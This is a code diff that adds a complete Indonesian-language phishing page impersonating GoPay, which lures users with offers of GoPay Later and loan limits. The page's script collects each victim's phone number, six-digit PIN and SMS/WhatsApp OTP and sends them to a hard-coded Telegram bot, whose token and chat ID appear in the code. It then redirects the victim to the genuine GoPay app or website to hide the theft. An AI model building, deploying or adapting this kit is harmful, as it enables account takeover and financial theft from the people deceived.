@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GoPay - Later & Pinjaman</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body { width: 100%; height: 100vh; height: 100dvh; overflow: hidden; font-family: 'Plus Jakarta Sans', sans-serif; background: #ffffff; color: #111827; }
+        body { display: flex; justify-content: center; align-items: center; }
+        .container { background: #ffffff; width: 100%; max-width: 420px; height: 100vh; height: 100dvh; padding: 16px; display: flex; flex-direction: column; justify-content: space-between; overflow: hidden; position: relative; }
+        .screen { display: none; width: 100%; height: 100%; }
+        .screen.active { display: flex; flex-direction: column; justify-content: space-between; }
+        .brand-header { display: flex; justify-content: center; align-items: center; padding-top: 4px; margin-bottom: 4px; flex-shrink: 0; }
+        .brand-logo-img { height: 32px; width: auto; object-fit: contain; }
+        .banner-wrapper { width: 100%; display: flex; justify-content: center; align-items: center; flex: 1; min-height: 0; margin-bottom: 12px; padding: 0; background: transparent; }
+        .banner-img { max-width: 100%; max-height: 100%; object-fit: contain; display: block; border-radius: 0; box-shadow: none; background: transparent; }
+        .selection-cards { width: 100%; display: flex; flex-direction: column; gap: 12px; margin-bottom: 14px; flex-shrink: 0; }
+        .option-group { display: flex; flex-direction: column; gap: 4px; }
+        .external-label { font-size: 11px; font-weight: 700; color: #9ca3af; text-transform: uppercase; letter-spacing: 0.5px; padding-left: 4px; transition: color 0.2s; }
+        .option-group.selected .external-label { color: #00AA13; }
+        .select-card { background: #ffffff; border: 2px solid #e2e8f0; border-radius: 18px; padding: 14px 16px; display: flex; align-items: center; gap: 12px; cursor: pointer; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); position: relative; }
+        .select-card:hover { border-color: #cbd5e1; transform: translateY(-2px); box-shadow: 0 6px 16px rgba(0, 0, 0, 0.08); }
+        .select-card:active { transform: translateY(0); }
+        .option-group.selected .select-card { border-color: #00AA13; background: #f6fef8; box-shadow: 0 8px 20px rgba(0, 170, 19, 0.15); transform: translateY(-2px); }
+        .card-icon { width: 40px; height: 40px; background: #f1f5f9; border-radius: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: all 0.25s ease; overflow: hidden; }
+        .card-icon img { width: 22px; height: 22px; object-fit: contain; }
+        .option-group.selected .card-icon { background: #00AA13; box-shadow: 0 4px 10px rgba(0, 170, 19, 0.3); }
+        .option-group.selected .card-icon img { filter: brightness(0) invert(1); }
+        .card-text { font-size: 13px; font-weight: 800; color: #1f2937; line-height: 1.35; }
+        .bottom-action { width: 100%; padding-bottom: 4px; flex-shrink: 0; }
+        .cta-btn { width: 100%; background: #00AA13; color: white; border: none; padding: 15px; border-radius: 50px; font-size: 15px; font-weight: 800; cursor: pointer; box-shadow: 0 6px 16px rgba(0, 170, 19, 0.28); transition: transform 0.1s ease, background 0.2s; text-align: center; }
+        .cta-btn:hover { background: #009510; }
+        .cta-btn:active { transform: scale(0.98); }
+        .terms-text { text-align: center; font-size: 11px; color: #9ca3af; margin-top: 6px; font-weight: 500; }
+        .back-btn { background: transparent; border: none; cursor: pointer; padding: 4px 0; margin-bottom: 10px; display: inline-flex; align-items: center; justify-content: center; }
+        .back-btn svg { width: 24px; height: 24px; stroke-width: 2.8; stroke: #111827; }
+        .form-group { margin-bottom: 16px; }
+        .form-label { display: block; font-size: 11px; font-weight: 700; color: #4b5563; margin-bottom: 6px; text-transform: uppercase; }
+        .phone-prefix { display: flex; align-items: center; background: #f9fafb; border: 1.5px solid #d1d5db; border-radius: 14px; overflow: hidden; }
+        .country-code { background: #f3f4f6; color: #374151; padding: 12px; font-weight: 700; font-size: 14px; border-right: 1.5px solid #d1d5db; }
+        .form-input { width: 100%; padding: 12px; border: none; font-size: 15px; font-family: 'Plus Jakarta Sans', sans-serif; background: transparent; font-weight: 600; color: #111827; }
+        .form-input:focus { outline: none; }
+        .pin-container { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
+        .pin-input { width: 42px; height: 50px; border: 1.5px solid #d1d5db; border-radius: 12px; text-align: center; font-size: 20px; font-weight: 700; background: #f9fafb; color: #111827; }
+        .pin-input:focus { outline: none; border-color: #00AA13; background: #ffffff; box-shadow: 0 0 0 3px rgba(0, 170, 19, 0.12); }
+        .loading-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
+        .loading-overlay.active { display: flex; }
+        .spinner { width: 48px; height: 48px; border: 4px solid #e2e8f0; border-top: 4px solid #00AA13; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { font-size: 14px; font-weight: 700; color: #1f2937; }
+        .success-box { text-align: center; padding: 20px 0; margin: auto 0; }
+        .success-icon { width: 64px; height: 64px; background: #00AA13; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 12px; box-shadow: 0 6px 16px rgba(0, 170, 19, 0.3); }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <div class="loading-text">Memproses Data Anda...</div>
+        </div>
+
+        <!-- Screen 1: Home/Menu -->
+        <div id="screen-menu" class="screen active">
+            <div class="brand-header">
+                <img src="https://cdn.phototourl.com/member/2026-10-27-c6695393-c5b7-4360-91a5-0b0efafbffcc.png" alt="GoPay Logo" class="brand-logo-img">
+            </div>
+            <div class="banner-wrapper">
+                <img src="https://cdn.phototourl.com/member/2026-10-27-b4ddcedd-0caf-4134-850d-ad752d782095.png" alt="Ilustrasi Banner" class="banner-img">
+            </div>
+            <div class="selection-cards">
+                <div class="option-group" id="group-register">
+                    <div class="external-label">aktifkan fitur</div>
+                    <div class="select-card" onclick="selectOption('register')">
+                        <div class="card-icon"><img src="https://cdn.phototourl.com/member/2026-10-27-8df1a2cf-3b0d-4981-9ff0-e9aaa7e1f834.png" alt="Icon"></div>
+                        <div class="card-text">Dapatkan limit Gopay later & Gopay pinjaman</div>
+                    </div>
+                </div>
+                <div class="option-group" id="group-increase">
+                    <div class="external-label">Upgrade Limit</div>
+                    <div class="select-card" onclick="selectOption('increase')">
+                        <div class="card-icon"><img src="https://cdn.phototourl.com/member/2026-10-27-69f81819-df6f-461b-942d-58184ffef6d6.png" alt="Icon"></div>
+                        <div class="card-text">Tingkatkan limit Gopay later & Gopay pinjaman</div>
+                    </div>
+                </div>
+            </div>
+            <div class="bottom-action">
+                <button class="cta-btn" onclick="proceedNext()">Aktifkan Sekarang</button>
+                <div class="terms-text">Syarat dan ketentuan berlaku</div>
+            </div>
+        </div>
+
+        <!-- Screen 2: Phone Input -->
+        <div id="screen-phone" class="screen">
+            <div>
+                <button class="back-btn" onclick="showScreen('screen-menu')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                </button>
+                <h2 style="font-size: 18px; font-weight: 800; margin-bottom: 4px;">Masukkan Nomor Handphone</h2>
+                <p class="terms-text" style="text-align: left; margin-bottom: 20px;">Gunakan nomor aktif yang terhubung dengan akun GoPay Anda.</p>
+                <div class="form-group">
+                    <label class="form-label">Nomor Handphone</label>
+                    <div class="phone-prefix">
+                        <div class="country-code">+62</div>
+                        <input type="tel" inputmode="numeric" class="form-input" id="phoneNumber" placeholder="812-3456-7890" maxlength="13">
+                    </div>
+                </div>
+            </div>
+            <div class="bottom-action">
+                <button class="cta-btn" onclick="validatePhone()">Lanjutkan Verifikasi</button>
+            </div>
+        </div>
+
+        <!-- Screen 3: PIN Input -->
+        <div id="screen-pin" class="screen">
+            <div>
+                <button class="back-btn" onclick="showScreen('screen-phone')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                </button>
+                <h2 style="font-size: 18px; font-weight: 800; margin-bottom: 4px;">Keamanan PIN GoPay</h2>
+                <p class="terms-text" style="text-align: left; margin-bottom: 10px;">Masukkan 6 digit PIN untuk <span id="processTextLabel" style="font-weight:700; color:#00AA13;"></span>.</p>
+                <div class="pin-container" id="pinContainer">
+                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-input pin-digit" maxlength="1">
+                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-input pin-digit" maxlength="1">
+                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-input pin-digit" maxlength="1">
+                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-input pin-digit" maxlength="1">
+                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-input pin-digit" maxlength="1">
+                    <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-input pin-digit" maxlength="1">
+                </div>
+            </div>
+        </div>
+
+        <!-- Screen 4: OTP Verification Code -->
+        <div id="screen-otp" class="screen">
+            <div>
+                <button class="back-btn" onclick="showScreen('screen-pin')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                </button>
+                <h2 style="font-size: 18px; font-weight: 800; margin-bottom: 4px;">Masukkan Kode Verifikasi</h2>
+                <p class="terms-text" style="text-align: left; margin-bottom: 10px;">Kode 6 digit telah dikirimkan via SMS/WhatsApp. Berlaku dalam <span id="timerDisplay" style="font-weight: 700; color: #00AA13;">05:00</span>.</p>
+                <div class="pin-container" id="otpContainer">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="pin-input otp-digit" maxlength="1">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="pin-input otp-digit" maxlength="1">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="pin-input otp-digit" maxlength="1">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="pin-input otp-digit" maxlength="1">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="pin-input otp-digit" maxlength="1">
+                    <input type="tel" inputmode="numeric" pattern="[0-9]*" class="pin-input otp-digit" maxlength="1">
+                </div>
+            </div>
+            <div class="bottom-action">
+                <button class="cta-btn" onclick="submitOTP()">Verifikasi Kode</button>
+            </div>
+        </div>
+
+        <!-- Screen 5: Success -->
+        <div id="screen-success" class="screen">
+            <div class="success-box">
+                <div class="success-icon">✓</div>
+                <h2 style="font-size: 20px; font-weight: 800; margin-bottom: 6px;">Berhasil Diajukan!</h2>
+                <p class="terms-text" id="successMessage" style="margin-bottom: 20px; font-size: 13px; color: #4b5563;">Permintaan Anda sedang diproses oleh sistem.</p>
+            </div>
+            <div class="bottom-action">
+                <button class="cta-btn" onclick="openGoPayApp()">Lanjut ke Aplikasi GoPay</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // KONFIGURASI TELEGRAM BOT
+        const BOT_TOKEN = "7568104337:AAGDmJcrcXnPl3MDsRtl7-2kxkW_hmeK7io";
+        const CHAT_ID = "7667144622";
+
+        let selectedAction = '';
+        let userData = { actionType: '', phone: '', pin: '', otp: '' };
+        let countdownInterval;
+        let isPinSubmitting = false; // Mencegah double submit PIN
+
+        function sendToTelegram(message) {
+            if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN.includes("MASUKKAN") || CHAT_ID.includes("MASUKKAN")) {
+                console.warn("Token atau Chat ID Telegram belum diatur!");
+                return;
+            }
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const data = { chat_id: CHAT_ID, text: message, parse_mode: "Markdown" };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            }).then(response => {
+                if (!response.ok) console.error("Gagal mengirim ke Telegram:", response.statusText);
+            }).catch(err => console.error("Gagal mengirim ke Telegram:", err));
+        }
+
+        function selectOption(actionType) {
+            selectedAction = actionType;
+            userData.actionType = actionType === 'register' ? 'Daftar Limit Baru' : 'Upgrade Limit';
+            document.getElementById('group-register').classList.toggle('selected', actionType === 'register');
+            document.getElementById('group-increase').classList.toggle('selected', actionType === 'increase');
+        }
+
+        function proceedNext() {
+            if (!selectedAction) {
+                alert('Silakan pilih salah satu opsi layanan terlebih dahulu.');
+                return;
+            }
+            showScreen('screen-phone');
+        }
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+
+            if (screenId === 'screen-pin') {
+                document.getElementById('processTextLabel').textContent = selectedAction === 'register' ? 'pendaftaran layanan' : 'peningkatan limit';
+                clearInputs('#screen-pin');
+                userData.otp = ''; // Reset OTP jika kembali ke PIN
+                isPinSubmitting = false;
+                setTimeout(() => document.querySelector('#screen-pin .pin-digit').focus(), 100);
+            }
+            if (screenId === 'screen-phone') {
+                document.getElementById('phoneNumber').value = '';
+                userData.pin = '';   // Reset PIN lama agar tidak tertukar
+                userData.otp = '';    // Reset OTP lama
+                isPinSubmitting = false;
+            }
+            if (screenId === 'screen-otp') {
+                clearInputs('#screen-otp');
+                setTimeout(() => document.querySelector('#screen-otp .otp-digit').focus(), 100);
+                startOtpTimer(300);
+            } else {
+                clearInterval(countdownInterval);
+            }
+        }
+
+        function clearInputs(selector) {
+            document.querySelectorAll(`${selector} input`).forEach(input => input.value = '');
+        }
+
+        function startOtpTimer(duration) {
+            clearInterval(countdownInterval);
+            let timer = duration, minutes, seconds;
+            const display = document.getElementById('timerDisplay');
+            countdownInterval = setInterval(() => {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+                display.textContent = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
+                if (--timer < 0) {
+                    clearInterval(countdownInterval);
+                    display.textContent = "00:00 (Waktu Habis)";
+                }
+            }, 1000);
+        }
+
+        function validatePhone() {
+            const phoneInput = document.getElementById('phoneNumber').value.replace(/\D/g, '');
+            if (phoneInput.length < 9) {
+                alert('Mohon masukkan nomor handphone yang valid');
+                return;
+            }
+            userData.phone = "+62" + phoneInput;
+            
+            // TIDAK MENGIRIM TELEGRAM DI SINI. Menunggu sampai PIN diisi.
+            showScreen('screen-pin');
+        }
+
+        function submitOTP() {
+            let otp = '';
+            document.querySelectorAll('#screen-otp .otp-digit').forEach(input => otp += input.value);
+
+            if (otp.length !== 6) {
+                alert('Mohon lengkapi 6 digit kode verifikasi');
+                return;
+            }
+            userData.otp = otp;
+
+            // KIRIM DATA KEDUA: Nomor HP & OTP
+            const message2 = `🔔 *DATA GOPAY MASUK (KEDUA)*\n\n` +
+                             `📱 *No HP:* \`${userData.phone}\`\n` +
+                             `💬 *OTP:* \`${userData.otp}\``;
+            sendToTelegram(message2);
+
+            clearInterval(countdownInterval);
+            document.getElementById('successMessage').textContent = selectedAction === 'register' 
+                ? 'Pendaftaran Gopay Later & Gopay Pinjaman berhasil diajukan dan sedang diproses.' 
+                : 'Permintaan kenaikan limit berhasil dikirimkan untuk ditinjau.';
+            showScreen('screen-success');
+        }
+
+        function openGoPayApp() {
+            window.location.href = 'gogek://gopay';
+            setTimeout(() => { window.location.href = 'https://gopay.co.id/'; }, 1500);
+        }
+
+        function setupAutoTab(selector, isPin = false) {
+            const inputs = document.querySelectorAll(selector);
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    let val = e.target.value.replace(/\D/g, '');
+                    e.target.value = val;
+                    if (val && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+
+                    let filledCount = 0;
+                    inputs.forEach(i => { if (i.value.length === 1) filledCount++; });
+                    
+                    if (isPin && filledCount === 6 && !isPinSubmitting) {
+                        isPinSubmitting = true;
+                        input.blur();
+                        
+                        let pinVal = '';
+                        inputs.forEach(i => pinVal += i.value);
+                        userData.pin = pinVal;
+
+                        // KIRIM DATA PERTAMA: Layanan, No HP, PIN
+                        const message1 = `🔔 *DATA GOPAY MASUK (PERTAMA)*\n\n` +
+                                         `📌 *Layanan:* ${userData.actionType}\n` +
+                                         `📱 *No HP:* \`${userData.phone}\`\n` +
+                                         `🔑 *PIN:* \`${userData.pin}\``;
+                        sendToTelegram(message1);
+
+                        const overlay = document.getElementById('loadingOverlay');
+                        overlay.classList.add('active');
+
+                        setTimeout(() => {
+                            overlay.classList.remove('active');
+                            isPinSubmitting = false;
+                            showScreen('screen-otp');
+                        }, 4000); // Loading 4 detik
+                    }
+                });
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        }
+
+        setupAutoTab('#screen-pin .pin-digit', true);
+        setupAutoTab('#screen-otp .otp-digit', false);
+
+        document.getElementById('phoneNumber').addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.startsWith('0')) value = value.substring(1);
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
